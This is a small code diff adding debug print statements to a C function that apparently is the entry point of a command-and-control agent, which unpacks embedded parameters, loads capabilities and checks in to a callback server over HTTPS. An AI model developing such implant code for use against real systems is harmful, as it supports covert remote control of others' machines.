@@ -105,10 +105,14 @@ void go() {
 	AgentCapabilities capabilities = { 0 };
 	
 	unpack_params(RAW_PARAMS, &state.params);
+	dprintf("Parameters unpacked.");
+	
 	load_picos(&capabilities);
+	dprintf("Loaded PICO capabilities.");
 	
 	state.http = HttpInit(state.params.callback_https);
 	
+	dprintf("Checking in...");
 	CheckinReply checkin_reply = { 0 };
 	perform_checkin(&state.params, &capabilities, state.http, &checkin_reply);
 	
